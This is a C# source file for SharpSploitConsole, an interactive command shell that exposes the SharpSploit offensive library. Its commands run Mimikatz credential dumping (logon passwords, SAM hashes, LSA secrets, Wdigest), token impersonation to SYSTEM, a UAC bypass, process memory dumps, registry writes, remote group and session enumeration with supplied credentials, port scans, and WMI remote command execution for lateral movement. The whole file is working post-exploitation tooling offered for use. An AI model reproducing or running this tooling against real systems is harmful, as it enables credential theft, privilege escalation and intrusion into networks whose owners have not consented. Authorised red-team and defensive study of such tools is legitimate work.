using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;

/*
Author: Shawn Jones, Twitter: @anthemtotheego
License: BSD 3-Clause
Find Sharpsploit: https://github.com/cobbr/SharpSploit  
*/

namespace SharpSploitConsole
{
    class Program
    {
        static void Main(string[] args)
        {
            if (args.Length <= 0)
            {
                string asci =
@"
                           

                                          
                                                                
                         _________.__                         _________      .__         .__  __   
                        /   _____/|  |__ _____ _____________ /   _____/_____ |  |   ____ |__|/  |_ 
                        \_____  \ |  |  \\__  \\_  __ \____ \\_____  \\____ \|  |  /  _ \|  \   __\
                        /        \|   Y  \/ __ \|  | \/  |_> >        \  |_> >  |_(  <_> )  ||  |  
                       /_______  /|___|  (____  /__|  |   __/_______  /   __/|____/\____/|__||__|  
                               \/      \/     \/      |__|          \/|__|                         ";

                string console = "@                                                [Console Edition]@@" +
                                  "                                           Written by anthemtotheego@@" +
                                  "@" +
                                  "                                        Type help or ? to show menu options@@@@";

                console = console.Replace("@", System.Environment.NewLine);
                Console.WriteLine(asci);
                Console.WriteLine(console);
            }
            while (true)
            {
                Console.Write("SharpSploitConsole:> ");

                //Get command from user and process
                String command = RL();
                String error = ER();
                Char delimiter = ' ';
                String[] request = command.Split(delimiter);
                
                //exit program
                if (request[0] == "exit")
                {
                    Environment.Exit(0);
                }
                else if (request[0] == "help" || request[0] == "?")
                {
                    Console.WriteLine();
                    Console.WriteLine("SharpSploit Credentials Commands");
                    Console.WriteLine("--------------------------------");
                    Console.WriteLine();
                    Console.WriteLine("Mimikatz");
                    Console.WriteLine("--------");
                    Console.WriteLine();
                    Console.WriteLine("Mimi-All                     Executes everything but DCSync - requires admin");
                    Console.WriteLine("Mimi-Command                 Executes a chosen Mimikatz command");
                    Console.WriteLine("logonPasswords               Runs privilege::debug sekurlsa::logonPasswords - requires admin");
                    Console.WriteLine("LsaCache                     Retrieve Domain Cached Credentials hashes from registry - requires admin");
                    Console.WriteLine("LsaSecrets                   Retrieve LSA secrets stored in registry - requires admin");
                    Console.WriteLine("SamDump                      Retrieve password hashes from the SAM database - requires admin");
                    Console.WriteLine("Wdigest                      Retrieve Wdigest credentials from registry");
                    Console.WriteLine();
                    Console.WriteLine("Tokens");
                    Console.WriteLine("------");
                    Console.WriteLine();
                    Console.WriteLine("whoami                       Retrieve current user");
                    Console.WriteLine("GetSystem                    Impersonate system user, requires admin rights");
                    Console.WriteLine("BypassUAC                    Bypass UAC, requires binary, command | path to binary - requires admin rights");
                    Console.WriteLine("RevertToSelf                 Ends the impersonation of any token, reverts back to initial token associated with current process");
                    Console.WriteLine();
                    Console.WriteLine("SharpSploit Enumeration Commands");
                    Console.WriteLine("--------------------------------");
                    Console.WriteLine();
                    Console.WriteLine("CurrentDirectory             Retrieve current working directory");
                    Console.WriteLine("DirectoryListing             Retrieve current directory listing");
                    Console.WriteLine("ChangeDirectory              Changes the current directory by appending a specified string to the current working directory");
                    Console.WriteLine("Hostname                     Retrieve hostname");
                    Console.WriteLine("ProcessList                  Retrieve list of running processes");
                    Console.WriteLine("ProcDump                     Creates a minidump of the memory of a running process, requires PID | output location | output name - requires admin");
                    Console.WriteLine("Username                     Retrieve current username");
                    Console.WriteLine("ReadRegistry                 Retrieve registry path value, requires full path argument");
                    Console.WriteLine("WriteRegistry                Write to registry, requires full path | value");
                    Console.WriteLine("NetLocalGroupMembers         Retrieve users of local group remotely, requires computername | groupname | username | password");
                    Console.WriteLine("NetLocalGroups               Retrieve local groups remotely, requires computername | username | password");
                    Console.WriteLine("NetLoggedOnUsers             Retrieve current logged on users remotely, requires computername| username | password");
                    Console.WriteLine("NetSessions                  Retrieve user sessions remotely, requires computername | username | password");
                    Console.WriteLine("Ping                         Ping systems, requires computernames");
                    Console.WriteLine("PortScan                     Port scan systems, requires computername | ports");
                    Console.WriteLine();
                    Console.WriteLine("SharpSploit Lateral Movement Commands");
                    Console.WriteLine("--------------------------------");
                    Console.WriteLine();
                    Console.WriteLine("WMI                          Run command remotely via WMI, requires computername | username | password | command - requires admin");
                    Console.WriteLine();
                    Console.WriteLine();
                }
                //SharpSploit Credential Modules
                //Mimikatz class begin
                else if (request[0] == "Mimi-All")
                {
                    try
                    {
                        var a = SharpSploit.Credentials.Mimikatz.All();
                        Console.WriteLine(a);
                    }
                    catch
                    {
                        Console.WriteLine(error);
                    }
                }
                else if (request[0] == "Mimi-Command")
                {
                    try
                    {
                        List<string> clist = new List<string>();
                        clist = String.Join(" ", request).Split(' ').Skip(1).ToList();
                        command = String.Join(" ", clist);
                        var a = SharpSploit.Credentials.Mimikatz.Command(command);
                        Console.WriteLine(a);
                    }
                    catch
                    {
                        Console.WriteLine(error);
                    }
                }
                else if (request[0] == "logonPasswords")
                {
                    try
                    {
                        var a = SharpSploit.Credentials.Mimikatz.LogonPasswords();
                        Console.WriteLine(a);
                    }
                    catch
                    {
                        Console.WriteLine(error);
                    }
                }
                else if (request[0] == "LsaCache")
                {
                    try
                    {
                        var a = SharpSploit.Credentials.Mimikatz.LsaCache();
                        Console.WriteLine(a);
                    }
                    catch
                    {
                        Console.WriteLine(error);
                    }
                }
                else if (request[0] == "LsaSecrets")
                {
                    try
                    {
                        var a = SharpSploit.Credentials.Mimikatz.LsaSecrets();
                        Console.WriteLine(a);
                    }
                    catch
                    {
                        Console.WriteLine(error);
                    }
                }
                else if (request[0] == "SamDump")
                {
                    try
                    {
                        var a = SharpSploit.Credentials.Mimikatz.SamDump();
                        Console.WriteLine(a);
                    }
                    catch
                    {
                        Console.WriteLine(error);
                    }
                }
                else if (request[0] == "Wdigest")
                {
                    try
                    {
                        var a = SharpSploit.Credentials.Mimikatz.Wdigest();
                        Console.WriteLine(a);
                    }
                    catch
                    {
                        Console.WriteLine(error);
                    }
                }
                //Token Class Begin
                else if (request[0] == "whoami")
                {
                    try
                    {
                        SharpSploit.Credentials.Tokens whoami = new SharpSploit.Credentials.Tokens();
                        var a = whoami.WhoAmI();
                        Console.WriteLine(a);
                    }
                    catch
                    {
                        Console.WriteLine(error);
                    }
                }
                else if (request[0] == "GetSystem")
                {
                    try
                    {
                        SharpSploit.Credentials.Tokens getSys = new SharpSploit.Credentials.Tokens();
                        var a = getSys.GetSystem();
                        Console.WriteLine(a);
                    }
                    catch
                    {
                        Console.WriteLine(error);
                    }
                }
                else if (request[0] == "BypassUAC")
                {
                    try
                    {
                        SharpSploit.Credentials.Tokens uac = new SharpSploit.Credentials.Tokens();
                        int pid = 0;
                        uac.BypassUAC(request[1], request[2], request[3], pid);                        
                    }
                    catch
                    {
                        Console.WriteLine(error);
                    }
                }
                else if (request[0] == "RevertToSelf")
                {
                    try
                    {
                        SharpSploit.Credentials.Tokens revert = new SharpSploit.Credentials.Tokens();
                        var a = revert.RevertToSelf();
                        Console.WriteLine(a);
                    }
                    catch
                    {
                        Console.WriteLine(error);
                    }
                }
                //SharpSploit Enumeration Modules
                else if (request[0] == "CurrentDirectory")
                {
                    try
                    {
                        var a = SharpSploit.Enumeration.Host.GetCurrentDirectory();
                        Console.WriteLine(a);
                    }
                    catch
                    {
                        Console.WriteLine(error);
                    }
                }
                else if (request[0] == "DirectoryListing")
                {
                    try
                    {
                        var a = SharpSploit.Enumeration.Host.GetDirectoryListing();
                        Console.WriteLine(a);
                    }
                    catch
                    {
                        Console.WriteLine(error);
                    }
                }
                else if (request[0] == "ChangeDirectory")
                {
                    try
                    {
                        SharpSploit.Enumeration.Host.ChangeCurrentDirectory(request[1]);
                    }
                    catch
                    {
                        Console.WriteLine(error);
                    }
                }
                else if (request[0] == "Hostname")
                {
                    try
                    {
                        var a = SharpSploit.Enumeration.Host.GetHostname();
                        Console.WriteLine(a);
                    }
                    catch
                    {
                        Console.WriteLine(error);
                    }
                }
                else if (request[0] == "ProcessList")
                {
                    try
                    {
                        var a = SharpSploit.Enumeration.Host.GetProcessList();
                        Console.WriteLine(a);
                    }
                    catch
                    {
                        Console.WriteLine(error);
                    }
                }
                else if (request[0] == "ProcDump")
                {
                    try
                    {
                        int pid = Int32.Parse(request[1]);
                        SharpSploit.Enumeration.Host.CreateProcessDump(pid, request[2], request[3]);
                    }
                    catch
                    {
                        Console.WriteLine(error);
                    }
                }
                else if (request[0] == "Username")
                {
                    try
                    {
                        var a = SharpSploit.Enumeration.Host.GetUsername();
                        Console.WriteLine(a);
                    }
                    catch
                    {
                        Console.WriteLine(error);
                    }
                }
                else if (request[0] == "ReadRegistry")
                {
                    try
                    {
                        var a = SharpSploit.Enumeration.Host.RegistryRead(request[1]);
                        Console.WriteLine(a);
                    }
                    catch
                    {
                        Console.WriteLine(error);
                    }

                }
                else if (request[0] == "WriteRegistry")
                {
                    try
                    {
                        var a = SharpSploit.Enumeration.Host.RegistryWrite(request[1], request[2]);
                        Console.WriteLine(a);
                    }
                    catch
                    {
                        Console.WriteLine(error);
                    }
                }
                else if (request[0] == "NetLocalGroupMembers")
                {
                    try
                    {
                        var Creds = new SharpSploit.Enumeration.Domain.Credential(request[3], request[4]);
                        var a = SharpSploit.Enumeration.Net.GetNetLocalGroupMembers(request[1], request[2], Creds);
                        foreach (var i in a)
                        {
                            Console.WriteLine(i);
                        }
                    }
                    catch
                    {
                        Console.WriteLine(error);
                    }
                }
                else if (request[0] == "NetLocalGroups")
                {
                    try
                    {
                        var Creds = new SharpSploit.Enumeration.Domain.Credential(request[2], request[3]);
                        var a = SharpSploit.Enumeration.Net.GetNetLocalGroups(request[1], Creds);
                        foreach (var i in a)
                        {
                            Console.WriteLine(i);
                        }
                    }
                    catch
                    {
                        Console.WriteLine(error);
                    }
                }
                else if (request[0] == "NetLoggedOnUsers")
                {
                    try
                    {
                        var Creds = new SharpSploit.Enumeration.Domain.Credential(request[2], request[3]);
                        var a = SharpSploit.Enumeration.Net.GetNetLoggedOnUsers(request[1], Creds);
                        foreach (var i in a)
                        {
                            Console.WriteLine(i);
                        }
                    }
                    catch
                    {
                        Console.WriteLine(error);
                    }
                }
                else if (request[0] == "NetSessions")
                {
                    try
                    {
                        var Creds = new SharpSploit.Enumeration.Domain.Credential(request[2], request[3]);
                        var a = SharpSploit.Enumeration.Net.GetNetSessions(request[1], Creds);
                        foreach (var i in a)
                        {
                            Console.WriteLine(i);
                        }
                    }
                    catch
                    {
                        Console.WriteLine(error);
                    }
                }
                else if (request[0] == "Ping")
                {
                    try
                    {
                        int Time = 250;
                        int Thread = 100;
                        List<string> clist = new List<string>();
                        clist = String.Join(" ", request).Split(' ').Skip(1).ToList();
                        var a = SharpSploit.Enumeration.Network.Ping(clist, Time, Thread);
                        Console.WriteLine(a);
                    }
                    catch
                    {
                        Console.WriteLine(error);
                    }
                }
                else if (request[0] == "PortScan")
                {
                    try
                    {
                        int Time = 250;
                        int Thread = 100;
                        bool Ping = true;
                        List<string> plist = new List<string>();
                        List<int> plist1 = new List<int>();
                        plist = String.Join(" ", request).Split(' ').Skip(2).ToList();
                        plist1 = plist.Select(int.Parse).ToList();
                        var a = SharpSploit.Enumeration.Network.PortScan(request[1], plist1, Ping, Time, Thread);
                        Console.WriteLine(a);
                    }
                    catch
                    {
                        Console.WriteLine(error);
                    }
                }
                //SharpSploit Lateral Movement Modules
                else if (request[0] == "WMI")
                {
                    try
                    {
                        List<string> clist = new List<string>();
                        clist = String.Join(" ", request).Split(' ').Skip(4).ToList();
                        string cmd = string.Join(" ", clist); ;
                        var a = SharpSploit.LateralMovement.WMI.WMIExecute(request[1], cmd, request[2], request[3]);
                        Console.WriteLine(a);
                    }
                    catch
                    {
                        Console.WriteLine(error);
                    }
                }
                //Unknown command
                else
                {
                    Console.WriteLine("unknown command, type help for commandline options");
                }
            }//End While Loop
        }//End Main

        //Error message
        private static string ER()
        {
             string a = "Something went wrong! Check parameters or try running as an admin or system user";
             return a;
        }
         //Increases Readline from 256 chars to 8192 
        const int READLINE_BUFFER_SIZE = 8192;
        private static string RL()
        {
            Stream inputStream = Console.OpenStandardInput(READLINE_BUFFER_SIZE);
            Console.SetIn(new StreamReader(inputStream, Encoding.Default, false, 8192));
            return Console.ReadLine();
        }//end RL Method
    }
}
